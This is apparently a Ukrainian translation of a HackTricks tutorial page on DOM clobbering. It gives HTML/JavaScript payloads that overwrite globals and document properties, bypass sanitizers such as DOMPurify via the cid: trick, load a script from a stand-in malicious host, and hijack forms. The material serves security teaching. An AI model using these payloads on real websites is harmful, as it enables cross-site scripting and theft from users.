# Dom Clobbering

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ –∫–æ–º–ø–∞–Ω—ñ—ó**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É—î—Ç—å—Å—è –Ω–∞ HackTricks**? –∞–±–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **–û—Å–Ω–æ–≤–∏**

–ú–æ–∂–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **–≥–ª–æ–±–∞–ª—å–Ω—ñ –∑–º—ñ–Ω–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–∫—Å—Ç—É JS** –∑ –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏ **`id`** —Ç–∞ **`name`** –≤ HTML —Ç–µ–≥–∞—Ö.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**–õ–∏—à–µ** –ø–µ–≤–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∞—Ç—Ä–∏–±—É—Ç **name**, —â–æ–± –∑–∞–º—ñ–Ω–∏—Ç–∏ –≥–ª–æ–±–∞–ª—å–Ω—ñ –∑–º—ñ–Ω–Ω—ñ, –≤–æ–Ω–∏: `embed`, `form`, `iframe`, `image`, `img` —Ç–∞ `object`.

–¶—ñ–∫–∞–≤–æ, –∫–æ–ª–∏ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –µ–ª–µ–º–µ–Ω—Ç **form** –¥–ª—è **–∑–∞–º—ñ–Ω–∏** –∑–º—ñ–Ω–Ω–æ—ó, –≤–∏ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –∑–Ω–∞—á–µ–Ω–Ω—è **`toString`** —Å–∞–º–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç–∞: `[object HTMLFormElement]`, –∞–ª–µ –∑ **anchor** **`toString`** –±—É–¥–µ **`href`** —è–∫–æ—Ä—è. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ —Ç–µ–≥ **`a`** –¥–ª—è **–∑–∞–º—ñ–Ω–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏** **–∑–Ω–∞—á–µ–Ω–Ω—è**, –∫–æ–ª–∏ –≤–æ–Ω–æ **–æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è —è–∫ —Ä—è–¥–æ–∫**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### –ú–∞—Å–∏–≤–∏ —Ç–∞ –∞—Ç—Ä–∏–±—É—Ç–∏

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **–ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏ –º–∞—Å–∏–≤** —Ç–∞ **–∞—Ç—Ä–∏–±—É—Ç–∏ –æ–±'—î–∫—Ç–∞**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
–î–ª—è –∑–∞–º—ñ–Ω–∏ **—Ç—Ä–µ—Ç—å–æ–≥–æ –∞—Ç—Ä–∏–±—É—Ç—É** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, x.y.z), –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **`form`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
–ü–µ—Ä–µ–∑–∞–ø–∏—Å –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ —î **—Å–∫–ª–∞–¥–Ω—ñ—à–∏–º, –∞–ª–µ –≤—Å–µ —â–µ –º–æ–∂–ª–∏–≤–∏–º**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ iframes:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
–¢–µ–≥ —Å—Ç–∏–ª—é –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **–Ω–∞–¥–∞–Ω–Ω—è –¥–æ—Å—Ç–∞—Ç–Ω—å–æ–≥–æ —á–∞—Å—É iframe –¥–ª—è –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è**. –ë–µ–∑ –Ω—å–æ–≥–æ –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è –ø—Ä–æ **–Ω–µ–≤–∏–∑–Ω–∞—á–µ–Ω—ñ—Å—Ç—å**.
{% endhint %}

–î–ª—è –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –≥–ª–∏–±–æ–∫–∏—Ö –∞—Ç—Ä–∏–±—É—Ç—ñ–≤, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **iframes –∑ –∫–æ–¥—É–≤–∞–Ω–Ω—è–º html** —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **–û–±—Ö—ñ–¥ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó**

–Ø–∫—â–æ —Ñ—ñ–ª—å—Ç—Ä **–ø–µ—Ä–µ–±–∏—Ä–∞—î** **–≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ** –≤—É–∑–ª–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —á–æ–≥–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ `document.getElementByID('x').attributes`, –≤–∏ –º–æ–∂–µ—Ç–µ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏** –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å **`.attributes`** —Ç–∞ **–ø–æ—Ä—É—à–∏—Ç–∏ —Ñ—ñ–ª—å—Ç—Ä**. –Ü–Ω—à—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ DOM, —Ç–∞–∫—ñ —è–∫ **`tagName`**, **`nodeName`** –∞–±–æ **`parentNode`** —Ç–∞ —ñ–Ω—à—ñ, —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **–ü–µ—Ä–µ–∑–∞–ø–∏—Å `window.someObject`**

–£ JavaScript —á–∞—Å—Ç–æ –∑—É—Å—Ç—Ä—ñ—á–∞—î—Ç—å—Å—è:
```javascript
var someObject = window.someObject || {};
```
–ú–∞–Ω—ñ–ø—É–ª—é—é—á–∏ HTML –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ, –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤–∏–∑–Ω–∞—á–∏—Ç–∏ `someObject` –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤—É–∑–ª–∞ DOM, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤–≤–æ–¥–∏—Ç—å —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –±–µ–∑–ø–µ–∫–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –º–æ–∂–Ω–∞ –∑–∞–º—ñ–Ω–∏—Ç–∏ `someObject` –Ω–∞ –µ–ª–µ–º–µ–Ω—Ç —è–∫–æ—Ä—è, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —à–∫—ñ–¥–ª–∏–≤–∏–π —Å–∫—Ä–∏–ø—Ç:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
–£ –≤—Ä–∞–∑–ª–∏–≤–æ–º—É –∫–æ–¥—ñ, —Ç–∞–∫–æ–º—É —è–∫:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
–¶–µ–π –º–µ—Ç–æ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –¥–∂–µ—Ä–µ–ª–æ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –Ω–µ–±–∞–∂–∞–Ω–æ–≥–æ –∫–æ–¥—É.

**–•–∏—Ç—Ä—ñ—Å—Ç—å**: **`DOMPurify`** –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª **`cid:`**, —è–∫–∏–π **–Ω–µ –∫–æ–¥—É—î –ø–æ–¥–≤—ñ–π–Ω—ñ –ª–∞–ø–∫–∏ –≤ URL**. –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ –∑–∞–∫–æ–¥–æ–≤–∞–Ω—É –ø–æ–¥–≤—ñ–π–Ω—É –ª–∞–ø–∫—É, —è–∫–∞ –±—É–¥–µ —Ä–æ–∑–∫–æ–¥–æ–≤–∞–Ω–∞ –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è**. –¢–æ–º—É –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è —á–æ–≥–æ—Å—å –ø–æ–¥—ñ–±–Ω–æ–≥–æ –¥–æ **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** –∑—Ä–æ–±–∏—Ç—å HTML –∑–∞–∫–æ–¥–æ–≤–∞–Ω–µ `&quot;` **—Ä–æ–∑–∫–æ–¥–æ–≤–∞–Ω–∏–º –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è** —Ç–∞ **–≤–∏–±—Ä–∞—Ç–∏—Å—è** –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É –¥–ª—è **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è** –ø–æ–¥—ñ—ó **`onerror`**.

–©–µ –æ–¥–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –µ–ª–µ–º–µ–Ω—Ç **`form`**. –î–µ—è–∫—ñ –∫–ª—ñ—î–Ω—Ç—Å—å–∫—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å –∞—Ç—Ä–∏–±—É—Ç–∏ –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç–∞ —Ñ–æ—Ä–º–∏ –¥–ª—è —ó—Ö –æ—á–∏—â–µ–Ω–Ω—è. –û–¥–Ω–∞–∫, –¥–æ–¥–∞–≤—à–∏ `input` –∑ `id=attributes` –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–æ—Ä–º–∏, –≤–∏ —Ñ–∞–∫—Ç–∏—á–Ω–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É—î—Ç–µ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å –∞—Ç—Ä–∏–±—É—Ç—ñ–≤, –∑–∞–ø–æ–±—ñ–≥–∞—é—á–∏ —Å–∞–Ω—ñ—Ç–∞—Ä—É –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ–∞–∫—Ç–∏—á–Ω–∏—Ö –∞—Ç—Ä–∏–±—É—Ç—ñ–≤.

–í–∏ –º–æ–∂–µ—Ç–µ [**–∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ —Ü—å–æ–≥–æ —Ç–∏–ø—É clobbering —É —Ü—å–æ–º—É –æ–ø–∏—Å—ñ CTF**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## –ü–µ—Ä–µ–∑–∞–ø–∏—Å –æ–±'—î–∫—Ç–∞ –¥–æ–∫—É–º–µ–Ω—Ç—É

–ó–≥—ñ–¥–Ω–æ –∑ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—î—é, –º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∞—Ç—Ä–∏–±—É—Ç–∏ –æ–±'—î–∫—Ç–∞ –¥–æ–∫—É–º–µ–Ω—Ç—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é DOM Clobbering:

> –Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [–ø—ñ–¥—Ç—Ä–∏–º—É—î —ñ–º–µ–Ω–æ–≤–∞–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ](https://webidl.spec.whatwg.org/#dfn-support-named-properties). –ü—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ —ñ–º–µ–Ω–∞ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π –æ–±'—î–∫—Ç–∞ [Document](https://html.spec.whatwg.org/multipage/dom.html#document) document —É –±—É–¥—å-—è–∫–∏–π –º–æ–º–µ–Ω—Ç —Å–∫–ª–∞–¥–∞—é—Ç—å—Å—è –∑ –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ, –≤ [–ø–æ—Ä—è–¥–∫—É –¥–µ—Ä–µ–≤–∞](https://dom.spec.whatwg.org/#concept-tree-order) –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –µ–ª–µ–º–µ–Ω—Ç–∞, —è–∫–∏–π —ó—Ö –≤–Ω—ñ—Å, —ñ–≥–Ω–æ—Ä—É—é—á–∏ –ø—ñ–∑–Ω—ñ—à—ñ –¥—É–±–ª—ñ–∫–∞—Ç–∏, —ñ –∑—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –≤—ñ–¥ –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute), –∫–æ–ª–∏ —Ç–æ–π —Å–∞–º–∏–π –µ–ª–µ–º–µ–Ω—Ç –≤–Ω–æ—Å–∏—Ç—å –æ–±–∏–¥–≤–∞:
>
> \- –ó–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É name –¥–ª—è –≤—Å—ñ—Ö [–≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö](https://html.spec.whatwg.org/multipage/dom.html#exposed) –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) —Ç–∞ [–≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö](https://html.spec.whatwg.org/multipage/dom.html#exposed) –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element), —è–∫—ñ –º–∞—é—Ç—å –Ω–µ–ø–æ—Ä–æ–∂–Ω—î –∑–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É name —Ç–∞ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è [—É –¥–µ—Ä–µ–≤—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞](https://dom.spec.whatwg.org/#in-a-document-tree) –∑ document —è–∫ —ó—Ö [–∫–æ—Ä—ñ–Ω—å](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- –ó–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) –¥–ª—è –≤—Å—ñ—Ö [–≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö](https://html.spec.whatwg.org/multipage/dom.html#exposed) –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element), —è–∫—ñ –º–∞—é—Ç—å –Ω–µ–ø–æ—Ä–æ–∂–Ω—î –∑–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) —Ç–∞ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è [—É –¥–µ—Ä–µ–≤—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞](https://dom.spec.whatwg.org/#in-a-document-tree) –∑ document —è–∫ —ó—Ö [–∫–æ—Ä—ñ–Ω—å](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- –ó–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) –¥–ª—è –≤—Å—ñ—Ö –µ–ª–µ–º–µ–Ω—Ç—ñ–≤ [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element), —è–∫—ñ –º–∞—é—Ç—å —è–∫ –Ω–µ–ø–æ—Ä–æ–∂–Ω—î –∑–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute), —Ç–∞–∫ —ñ –Ω–µ–ø–æ—Ä–æ–∂–Ω—î –∑–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç—É name —Ç–∞ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è [—É –¥–µ—Ä–µ–≤—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞](https://dom.spec.whatwg.org/#in-a-document-tree) –∑ document —è–∫ —ó—Ö [–∫–æ—Ä—ñ–Ω—å](https://dom.spec.whatwg.org/#concept-tree-root).

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü—é —Ç–µ—Ö–Ω—ñ–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω—ñ **–∑–Ω–∞—á–µ–Ω–Ω—è, —Ç–∞–∫—ñ —è–∫ `document.cookie`, `document.body`, `document.children`**, –∞ —Ç–∞–∫–æ–∂ –º–µ—Ç–æ–¥–∏ –≤ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ Document, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)¬†[img, form, cookie: img]

typeof(document.cookie)
'object
```
## –ó–∞–ø–∏—Å –ø—ñ—Å–ª—è –µ–ª–µ–º–µ–Ω—Ç—É, —è–∫–∏–π –±—É–≤ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∏–π

–†–µ–∑—É–ª—å—Ç–∞—Ç–∏ –≤–∏–∫–ª–∏–∫—ñ–≤ **`document.getElementById()`** —Ç–∞ **`document.querySelector()`** –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω—ñ —à–ª—è—Ö–æ–º –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è —Ç–µ–≥—É `<html>` –∞–±–æ `<body>` –∑ —ñ–¥–µ–Ω—Ç–∏—á–Ω–∏–º –∞—Ç—Ä–∏–±—É—Ç–æ–º id. –û—Å—å —è–∫ —Ü–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
–ö—Ä—ñ–º —Ç–æ–≥–æ, –∑–∞—Å—Ç–æ—Å–æ–≤—É—é—á–∏ —Å—Ç–∏–ª—ñ –¥–ª—è –ø—Ä–∏—Ö–æ–≤—É–≤–∞–Ω–Ω—è —Ü–∏—Ö –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–∏—Ö —Ç–µ–≥—ñ–≤ HTML/body, –º–æ–∂–Ω–∞ —É–Ω–∏–∫–Ω—É—Ç–∏ –≤—Ç—Ä—É—á–∞–Ω–Ω—è —ñ–Ω—à–æ–≥–æ —Ç–µ–∫—Å—Ç—É –≤ `innerText`, —â–æ –ø—ñ–¥–≤–∏—â—É—î –µ—Ñ–µ–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å –∞—Ç–∞–∫–∏:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
–î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è SVG –ø–æ–∫–∞–∑–∞–ª–∏, —â–æ —Ç–µ–≥ `<body>` —Ç–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
–î–ª—è —Ç–æ–≥–æ, —â–æ–± —Ç–µ–≥ HTML –ø—Ä–∞—Ü—é–≤–∞–≤ —É –º–µ–∂–∞—Ö SVG —É –±—Ä–∞—É–∑–µ—Ä–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ Chrome —Ç–∞ Firefox, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏–π —Ç–µ–≥ `<foreignobject>`:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Ñ–æ—Ä–º

–ú–æ–∂–ª–∏–≤–æ –¥–æ–¥–∞–≤–∞—Ç–∏ **–Ω–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–æ—Ä–º–∏** –ø—Ä–æ—Å—Ç–æ, **–≤–∫–∞–∑–∞–≤—à–∏ –∞—Ç—Ä–∏–±—É—Ç `form`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–µ—è–∫–∏—Ö —Ç–µ–≥—ñ–≤. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ, —â–æ–± **–¥–æ–¥–∞–≤–∞—Ç–∏ –Ω–æ–≤—ñ –∑–Ω–∞—á–µ–Ω–Ω—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–æ—Ä–º–∏** —Ç–∞ –Ω–∞–≤—ñ—Ç—å –¥–æ–¥–∞–≤–∞—Ç–∏ –Ω–æ–≤—É **–∫–Ω–æ–ø–∫—É** –¥–ª—è **–≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è** (–∫–ª—ñ–∫–¥–∂–µ–∫—ñ–Ω–≥ –∞–±–æ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –¥–µ—è–∫–∏–º `.click()` JS –∫–æ–¥–æ–º):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ —Ñ–æ—Ä–º–∏ –≤ [**–∫–Ω–æ–ø—Ü—ñ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## References

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤: –í–∏–≤—á–∞–π—Ç–µ –¥—É–º–∞—Ç–∏ —è–∫ —Ö–∞–∫–µ—Ä.

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

